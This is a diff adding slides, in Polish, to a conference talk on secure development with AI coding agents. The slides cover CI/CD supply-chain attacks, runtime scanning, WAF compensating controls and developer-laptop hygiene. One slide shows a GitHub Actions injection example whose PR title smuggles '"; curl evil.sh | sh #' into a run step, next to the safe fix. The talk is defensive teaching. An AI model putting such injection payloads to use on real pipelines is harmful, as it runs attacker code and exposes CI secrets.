+    <line x1="980" y1="205" x2="1130" y2="205" stroke="#5b6475" stroke-width="6" marker-end="url(#ar)"/>
+    <path d="M770,130 C770,62 210,62 210,124" fill="none" stroke="#d23b3b" stroke-width="6" marker-end="url(#ar-red)"/>
+    <text x="490" y="38" text-anchor="middle" font-size="32" fill="#d23b3b" font-weight="700">„tu masz SQL injection” → agent poprawia</text>
+    <text x="830" y="380" text-anchor="middle" font-size="40" font-weight="800" fill="#2a6bd8">pętla: sekundy, nie dni</text>
+  </svg>
+  <p class="small">Agenci piszą więcej kodu niż kiedykolwiek, a więcej kodu to więcej podatności. Skaner musi być <b>w pętli agenta</b>, nie dopiero w CI.</p>
+</div>
+
+<!-- MAPA: przejście do CI/CD -->
+<div id="m-cicd" class="step map" data-mode="map" data-stage="map" data-highlight="cicd"
+     data-x="9000" data-y="0" data-scale="12.8" data-transition-duration="1600">
+  <div class="hud">Etap 3: <span style="color:var(--cicd)">CI/CD</span></div>
+</div>
+
+<!-- ================= 6. CI/CD ================= -->
+
+<div id="s20" class="step slide roomy" data-stage="cicd" data-x="10925" data-y="-625">
+  <div class="kicker">CI/CD</div>
+  <h2>CI/CD to też kod. I ma klucze do królestwa.</h2>
+  <svg viewBox="0 0 1660 430" width="1660" aria-label="Uprawnienia pipeline'u">
+    <defs><marker id="ar2" markerWidth="12" markerHeight="12" refX="9" refY="6" orient="auto"><path d="M0,0 L12,6 L0,12 z" fill="#df7a12"/></marker></defs>
+    <rect x="640" y="150" width="380" height="130" rx="24" fill="#df7a12"/>
+    <text x="830" y="232" text-anchor="middle" font-size="46" font-weight="800" fill="white">Runner CI</text>
+    <g font-size="38" font-weight="700" fill="#1b2130" text-anchor="middle">
+      <rect x="40" y="30" width="400" height="110" rx="20" fill="#f6f7fa" stroke="#d5dae3" stroke-width="4"/><text x="240" y="98">Repo (zapis)</text>
+      <rect x="40" y="290" width="400" height="110" rx="20" fill="#f6f7fa" stroke="#d5dae3" stroke-width="4"/><text x="240" y="358">Rejestr artefaktów</text>
+      <rect x="1220" y="30" width="400" height="110" rx="20" fill="#f6f7fa" stroke="#d5dae3" stroke-width="4"/><text x="1420" y="98">Chmura (deploy)</text>
+      <rect x="1220" y="290" width="400" height="110" rx="20" fill="#fdf0f0" stroke="#f2c4c4" stroke-width="4"/><text x="1420" y="358">Sekrety 🔑</text>
+    </g>
+    <g stroke="#df7a12" stroke-width="6" marker-end="url(#ar2)">
+      <line x1="640" y1="190" x2="450" y2="110"/><line x1="640" y1="245" x2="450" y2="330"/>
+      <line x1="1020" y1="190" x2="1210" y2="110"/><line x1="1020" y1="245" x2="1210" y2="330"/>
+    </g>
+  </svg>
+  <p class="small"><b>OWASP Top 10:2025, A03: Software Supply Chain Failures.</b> Najwyższa częstość występowania, prawie zero CVE.</p>
+</div>
+
+<div id="s21" class="step slide roomy" data-stage="cicd" data-x="13075" data-y="-625">
+  <div class="kicker">CI/CD · 19 marca 2026</div>
+  <h2>Trivy: skaner bezpieczeństwa jako broń</h2>
+  <ul class="clean small">
+    <li>Atakujący force-pushuje złośliwy kod do <b>75 z 76 tagów</b> <code>aquasecurity/trivy-action</code></li>
+    <li>Każdy pipeline z <code>uses: aquasecurity/trivy-action@v0.x</code> odpala ten kod</li>
+    <li>Kod czyta sekrety z pamięci runnera i je wysyła</li>
+    <li>Tag v0.35.0 nietknięty, bo miał <b>immutable releases</b></li>
+  </ul>
+  <div class="box red substep" style="margin-top:14px;padding:26px 36px">
+    <b style="font-size:40px">Pinuj SHA. Ale to nie wystarczy.</b>
+    <p class="xs" style="margin:10px 0 6px">Imposter commit: złośliwy commit w forku <code>actions/checkout</code>. Przez wspólną sieć forków <code>actions/checkout@&lt;sha&gt;</code> go uruchomi. SHA gwarantuje, że kod się nie zmienił, ale nie mówi, z którego repo pochodzi.</p>
+    <p class="xs muted" style="margin:0">PR: „bump checkout (security fix)”. W review widać <code>actions/checkout@a1b2c3…</code>: znajoma nazwa i 40 znaków, których nikt nie sprawdza.</p>
+  </div>
+</div>
+
+<div id="s22" class="step slide" data-stage="cicd" data-x="10925" data-y="625">
+  <div class="kicker">CI/CD · jak nie zwariować (1/2)</div>
+  <h2 style="margin-bottom:30px">Tooling złapie</h2>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:start">
+    <ul class="clean small tight">
+      <li>za szerokie uprawnienia <code>GITHUB_TOKEN</code><span class="sub">→ <code>permissions:</code> per job, minimum</span></li>
+      <li><code>pull_request_target</code> + checkout kodu z PR<span class="sub">„pwn request”: kod z forka odpalony z waszymi sekretami i tokenem z zapisem</span></li>
+      <li>niepinowane akcje<span class="sub"><code>@v1</code> jutro może znaczyć coś innego</span></li>
+      <li>injection przez <code>${{ github.event.* }}</code><span class="sub">przykład obok</span></li>
+      <li>długożyjące sekrety zamiast OIDC</li>
+    </ul>
+    <div>
+<pre class="code mini"><span class="c"># ❌ tekst wstawiony do skryptu przed wykonaniem</span>
+run: echo <span class="s">"${{ github.event.pull_request.title }}"</span>
+
+<span class="c"># tytuł PR:</span>
+<span class="hl">"; curl evil.sh | sh #</span>
+
+<span class="c"># ✅ przez zmienną: to tylko dane</span>
+env:
+  TITLE: <span class="s">${{ github.event.pull_request.title }}</span>
+run: echo <span class="s">"$TITLE"</span></pre>
+    </div>
+  </div>
+  <div class="punch" style="font-size:36px">Załóż, że akcja będzie złośliwa: minimalny token, OIDC, sekrety per job, kontrola ruchu wychodzącego.</div>
+</div>
+
+<div id="s22b" class="step slide" data-stage="cicd" data-x="13075" data-y="625">
+  <div class="kicker">CI/CD · jak nie zwariować (2/2)</div>
+  <h2 style="margin-bottom:30px">Człowiek musi</h2>
+  <ul class="clean small tight">
+    <li>rozumieć model zagrożeń CI/CD</li>
+    <li>śledzić nowe techniki: tagi → SHA → imposter commits</li>
+    <li>decydować, <b>komu ufamy</b>:</li>
+  </ul>
+  <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:28px;margin:6px 0 0 44px">
+    <div class="box tint" style="padding:24px 28px"><h3 style="font-size:34px;margin-bottom:10px">Akcje</h3><p class="xs" style="margin:0">oficjalne (<code>actions/*</code>, vendor) &gt; popularne community &gt; jednoosobowe. Im mniej z marketplace, tym lepiej. Prosty krok = 3 linijki basha.</p></div>
+    <div class="box tint" style="padding:24px 28px"><h3 style="font-size:34px;margin-bottom:10px">Ludzie</h3><p class="xs" style="margin:0">Kto ma write do repo? CODEOWNERS na <code>.github/workflows/</code>, branch protection z wymaganym review. Zmiana workflow = zmiana uprawnień.</p></div>
+    <div class="box tint" style="padding:24px 28px"><h3 style="font-size:34px;margin-bottom:10px">Podpisy</h3><p class="xs" style="margin:0">Wymagaj podpisanych commitów. Ale „Verified” mówi, <b>kto</b> podpisał, a nie że to ktoś zaufany.</p></div>
+  </div>
+  <div class="recommend">
+    <img class="avatar" src="img/alonso.jpg" alt=""><img class="avatar" src="img/sanchez.jpg" alt="" style="margin-left:-28px">
+    <div><span class="xs muted">Polecam:</span><br><b>„Beyond SHA Pinning: Security for CI/CD Pipelines”</b><br><span class="xs muted">Andoni Alonso &amp; Paco Sanchez, CfgMgmtCamp 2026</span></div>
+  </div>
+</div>
+
+<!-- MAPA: przejście do Runtime -->
+<div id="m-runtime" class="step map" data-mode="map" data-stage="map" data-highlight="runtime"
+     data-x="9000" data-y="0" data-scale="12.8" data-transition-duration="1600">
+  <div class="hud">Etap 4: <span style="color:var(--runtime)">runtime</span></div>
+</div>
+
+<!-- ================= 7. RUNTIME ================= -->
+
+<div id="s23" class="step slide roomy" data-stage="runtime" data-x="16925" data-y="-625">
+  <div class="kicker">Runtime · chmura</div>
+  <h2>CSPM</h2>
+  <ul class="clean">
+    <li>To, co <b>faktycznie działa</b>, a nie to, co zamierzałeś w IaC</li>
+    <li><b>Dryf:</b> kliknięte w konsoli, hotfix o 3 w nocy</li>
+    <li>Zasoby <b>spoza Terraforma</b></li>
+  </ul>
+</div>
+
+<div id="s24" class="step slide" data-stage="runtime" data-x="19075" data-y="-625">
+  <div class="kicker">Runtime · skanery</div>
+  <h2>Skanery runtime</h2>
+  <ul class="clean">
+    <li><b>Kubernetes:</b> konfiguracja klastra, obrazy, które naprawdę działają</li>
+    <li><b>VM i kontenery:</b> podatne pakiety na żywych maszynach</li>
+    <li><b>Monitoring powierzchni ataku:</b> co faktycznie wystawiacie do internetu<span class="sub">za darmo na start: <b>moje.cert.pl</b> (CERT Polska, skaner Artemis, open source)</span></li>
+  </ul>
+  <div class="punch">To działka, w której bardzo dużą część oddajemy toolingowi.</div>
+</div>
+
+<div id="s25" class="step slide" data-stage="runtime" data-x="16925" data-y="625">
+  <div class="kicker">Runtime · kontrola kompensująca</div>
+  <h2>Kup sobie czas</h2>
+  <svg viewBox="0 0 1660 340" width="1580" aria-label="Okno ekspozycji">
+    <line x1="40" y1="200" x2="420" y2="200" stroke="#1b2130" stroke-width="6"/>
+    <line x1="1440" y1="200" x2="1620" y2="200" stroke="#1b2130" stroke-width="6"/>
+    <rect x="420" y="150" width="1020" height="100" fill="#d23b3b" opacity=".18"/>
+    <rect x="420" y="150" width="1020" height="100" fill="none" stroke="#23966a" stroke-width="8" rx="12"/>
+    <text x="930" y="214" text-anchor="middle" font-size="44" font-weight="850" fill="#23966a">WAF / RASP</text>
+    <g font-size="34" font-weight="700" text-anchor="middle">
+      <circle cx="420" cy="200" r="18" fill="#d23b3b"/><text x="420" y="110" fill="#d23b3b">exploit (−7 dni)</text>
+      <circle cx="800" cy="250" r="14" fill="#1b2130"/><text x="800" y="320" fill="#1b2130">ujawnienie + patch</text>
+      <circle cx="1440" cy="200" r="18" fill="#23966a"/><text x="1440" y="110" fill="#23966a">wasz deploy</text>
+    </g>
+  </svg>
+  <div class="waf-logos"><figure><img src="img/cloudflare.svg" alt="Cloudflare"><figcaption>Cloudflare WAF</figcaption></figure><figure><img src="img/cloud-armor.svg" alt=""><figcaption>Google Cloud Armor</figcaption></figure><figure><img src="img/aws-waf.svg" alt=""><figcaption>AWS WAF</figcaption></figure></div>
+  <p style="margin-bottom:14px">Patch nie zdąży. Kontrola kompensująca blokuje exploit, zanim przyjdzie patch.</p>
+  <div class="box tint" style="padding:22px 32px"><p class="small" style="margin:0"><b>PHP2Shell (X 2026):</b> 2 × RCE w samym PHP (CVSS 9.2), znalezione przez zespoły ludzi z AI. Pierwsza próba ataku 17 X, łatka 21 X. Cloudflare włączył reguły WAF dla wszystkich, także darmowych, <b>ok. 9 h przed ujawnieniem</b>. AWS i Google też, automatycznie.</p></div>
+  <p class="xs muted" style="margin-top:14px">WAF patrzy na ruch. RASP patrzy na to, co aplikacja z nim robi. WAF to kontrola kompensująca, nie łatka.</p>
+</div>
+
+<div id="s26" class="step slide roomy" data-stage="runtime" data-x="19075" data-y="625">
+  <div class="kicker">Runtime · pentesty AI</div>
+  <h2>Obiecujące, ale z planem</h2>
+  <ul class="clean">
+    <li><b>Zakres:</b> co wolno, czego nie</li>
+    <li><b>Ograniczenia:</b> rate limiting, zakaz akcji destrukcyjnych, budżet</li>
+    <li><b>Kto ocenia wyniki:</b> agent znajdzie dużo, człowiek decyduje, co jest realne</li>
+    <li><b>Co potem:</b> findings → backlog → wracamy do lejka</li>
+  </ul>
+</div>
+
+<!-- ================= 8. TWIST: LAPTOP ================= -->
+
+<!-- S27: większy zoom out, Laptop był tam od początku -->
+<div id="s27" class="step map" data-mode="map" data-stage="map" data-bar="show" data-bar-current="laptop"
+     data-x="9000" data-y="1500" data-scale="14.5" data-transition-duration="2600">
+</div>
+
+<div id="s28" class="step slide" data-stage="laptop" data-x="6850" data-y="4450">
+  <div class="kicker">Laptop · październik 2026</div>
+  <div style="display:flex;align-items:baseline;gap:50px;margin-bottom:60px">
+    <div class="big-number" style="font-size:170px">6,3 mld $</div>
+    <p style="font-size:60px;font-weight:800;margin:0">Binance: kradzież z laptopa</p>
+  </div>
+  <div class="chain">
+    <div class="box substep"><div class="n">1</div><b>Fałszywa rozmowa o pracę</b><p class="xs muted">„zadanie rekrutacyjne” ze złośliwym repo, odpalone na służbowym komputerze inżyniera (IX 2026)</p></div>
+    <div class="arrow substep">→</div>
+    <div class="box substep"><div class="n">2</div><b>Przejęcie laptopa DevOpsa od portfeli</b><p class="xs muted">przez wewnętrzne narzędzie AI firmy (20 X)</p></div>
+    <div class="arrow substep">→</div>
+    <div class="box red substep"><div class="n">3</div><b>Stały token do deploymentu kontenerów → wypłaty</b><p class="xs muted">leżał na jego komputerze; użyty 29 X. Z tokenem na żądanie (JIT) nie byłoby czego ukraść</p></div>
+  </div>
+  <div class="source">Źródło: raport Binance (XI 2026). FBI: Korea Północna (TraderTraitor).</div>
+</div>
+
+<div id="s29" class="step slide" data-stage="laptop" data-x="9000" data-y="4450">
+  <div class="kicker">Laptop · 29 października 2026</div>
+  <h2>Ten sam agent, którego używasz</h2>
+  <p>Złośliwe wersje rozszerzenia <b>Claude Code</b> (2.1.312, 2.1.313) w marketplace <b>Cursora</b>.</p>
+  <ul class="clean">
+    <li><b>~11 godzin</b> w marketplace</li>
+    <li>Dopisuje klucz atakującego do <code>~/.ssh/authorized_keys</code> + tunel na zewnątrz<span class="sub">→ <b>dostęp zostaje po odinstalowaniu</b></span></li>
+    <li><b>~5 tys.</b> maszyn deweloperskich</li>
+  </ul>
+  <div class="box red" style="margin-top:20px;padding:20px 34px"><b>Sprawdź dziś:</b> <code>grep svc-telemetry ~/.ssh/authorized_keys</code><span class="sub">znacznik klucza z tej kampanii (wg Microsoft Security Blog)</span></div>
+  <p class="xs muted" style="margin-top:14px">Oficjalne kanały Anthropic (VS Code Marketplace, npm) nie były źródłem.</p>
+</div>
+
+<div id="s30" class="step slide roomy" data-stage="laptop" data-x="11150" data-y="4450">
+  <div class="kicker">Laptop · co z tym zrobić</div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:28px">
+    <div class="box"><h3>🧱 Sandbox dla agentów</h3><p class="small">Agent w sandboxie / devcontainerze, z ograniczonym shellem i siecią. Żadnego <code>--dangerously-skip-permissions</code> na hoście.</p></div>
+    <div class="box"><h3>🔑 Mniej sekretów na dysku</h3><p class="small">Nic długożyjącego w <code>.env</code> i <code>~/.ssh</code>. Klucze SSH na kluczu sprzętowym (FIDO2), sekrety z menedżera haseł przez CLI.</p></div>
+    <div class="box"><h3>⏱ JIT zamiast stałego dostępu</h3><p class="small">Admin na żądanie, na godziny, z audytem (PAM). Gdyby w Binance token wygasał po godzinie…</p></div>
+    <div class="box"><h3>📦 Supply chain na laptopie</h3><p class="small">Monitoring bibliotek, wtyczek IDE i rozszerzeń przeglądarki.</p></div>
+  </div>
+  <p class="small" style="margin-top:30px"><b>Narzędzia już są. Przegrywają z wygodą.</b> Włączenie ich to decyzja zespołu.</p>
+</div>
+
+<!-- ================= 9. FINAŁ ================= -->
+
+<div id="s31" class="step map" data-mode="final" data-stage="map"
+     data-x="9000" data-y="600" data-scale="14.5" data-transition-duration="2400">
+  <div class="hud">Gdzie AI, a gdzie człowiek?</div>
+  <!-- suwaki AI ↔ człowiek: pozycje wyliczone pod kadr (x=9000, y=600, scale 14.5) -->
+  <div class="hud-sliders">
+    <div class="hs hs-laptop" data-stage="laptop"  style="left:810px"><div class="track"><div class="knob" style="left:50%"></div></div><div class="ends"><span>AI</span><span>Człowiek</span></div><div class="verdict">higiena + sandbox</div></div>
+    <div class="hs" data-stage="projekt" style="left:189px"><div class="track"><div class="knob" style="left:90%"></div></div><div class="ends"><span>AI</span><span>Człowiek</span></div><div class="verdict">nie oddawaj kierownicy</div></div>
+    <div class="hs" data-stage="kod"     style="left:603px"><div class="track"><div class="knob" style="left:12%"></div></div><div class="ends"><span>AI</span><span>Człowiek</span></div><div class="verdict">toolingmaxxing</div></div>
+    <div class="hs" data-stage="cicd"    style="left:1017px"><div class="track"><div class="knob" style="left:32%"></div></div><div class="ends"><span>AI</span><span>Człowiek</span></div><div class="verdict">tooling + wiedza</div></div>
+    <div class="hs" data-stage="runtime" style="left:1431px"><div class="track"><div class="knob" style="left:25%"></div></div><div class="ends"><span>AI</span><span>Człowiek</span></div><div class="verdict">tooling + plan pentestów</div></div>
+  </div>
+</div>
+
+<div id="s32" class="step slide roomy" data-stage="prologue" data-x="4400" data-y="13000">
+  <div class="kicker">Cztery rzeczy, od najprostszej</div>
+  <h2>Patching engineering culture</h2>
+  <ul class="takeaways">
+    <li class="substep"><span class="when">Na dniach</span><span><b>Posprzątaj swój laptop</b><span class="sub">sekrety w .env i ~/.ssh, sandbox dla agenta</span></span></li>
+    <li class="substep"><span class="when">Tygodnie</span><span><b>Przejrzyj pipeline'y</b><span class="sub">Uprawnienia i jakość kodu: to kod produkcyjny!</span></span></li>
+    <li class="substep"><span class="when">Miesiące</span><span><b>Triage z kontekstem runtime</b><span class="sub">KEV, EPSS, reachability + co naprawdę działa i jest wystawione (CSPM, skanery)</span></span></li>
+    <li class="substep"><span class="when">Zawsze</span><span><b>Threat model przy następnym ficzerze</b><span class="sub">30 minut, cztery pytania, cały zespół</span></span></li>
+  </ul>
+</div>
+
+<div id="s33" class="step slide" data-stage="prologue" data-x="6550" data-y="13000">
+  <div class="center-stage" style="text-align:center">
+    <h1>Dziękuję!</h1>
+    <p style="font-size:56px;margin-top:40px" class="muted">Pytania?</p>
+    <p style="font-size:44px;margin-top:60px"><b>Krzysztof Ciesielski</b></p>
+    <p class="mono accent" style="font-size:40px;margin-top:10px">github.com/kciesielski/ai-ssdlc</p>
+    <div class="thanks-logos"><img src="img/softwaremill-plain.svg" alt="SoftwareMill"><img src="img/virtuslab.svg" alt="VirtusLab"><img src="img/aikido-wordmark.svg" alt="Aikido Security"></div>
+  </div>
+  <div class="thanks-ghost" style="left:110px"><svg viewBox="0 0 420 640" width="190" height="290"><path d="M210 0C96 0 20 86 20 200V640L90 585L160 640L210 590L260 640L330 585L400 640V200C400 86 324 0 210 0Z" fill="#202124"/><path d="M118 226L178 246L172 262L114 244Z" fill="#ea4335"/><path d="M302 226L242 246L248 262L306 244Z" fill="#ea4335"/></svg></div>
+  <div class="thanks-ghost" style="right:110px;transform:scaleX(-1)"><svg viewBox="0 0 420 640" width="190" height="290"><path d="M210 0C96 0 20 86 20 200V640L90 585L160 640L210 590L260 640L330 585L400 640V200C400 86 324 0 210 0Z" fill="#202124"/><path d="M118 226L178 246L172 262L114 244Z" fill="#ea4335"/><path d="M302 226L242 246L248 262L306 244Z" fill="#ea4335"/></svg></div>
+  <div class="thanks-camera"><svg viewBox="0 0 760 520" width="300" height="205"><rect x="640" y="20" width="60" height="240" rx="14" fill="#676c72"/><path d="M670 140L520 230" stroke="#676c72" stroke-width="44" stroke-linecap="round"/><circle cx="520" cy="230" r="44" fill="#676c72"/><circle cx="520" cy="230" r="18" fill="#959ca5"/><g transform="rotate(-28 400 220)"><rect x="40" y="120" width="460" height="170" rx="26" fill="#959ca5"/><rect x="40" y="250" width="460" height="40" rx="14" fill="#676c72"/><rect x="0" y="140" width="80" height="130" rx="18" fill="#444"/><g fill="#676c72"><rect x="380" y="160" width="80" height="12" rx="6"/><rect x="380" y="185" width="80" height="12" rx="6"/><rect x="380" y="210" width="80" height="12" rx="6"/></g></g></svg></div>
+</div>
+
+</div><!-- #impress -->
+
+<script src="js/impress.js"></script>
+<script src="js/deck.js"></script>
+</body>
+</html>
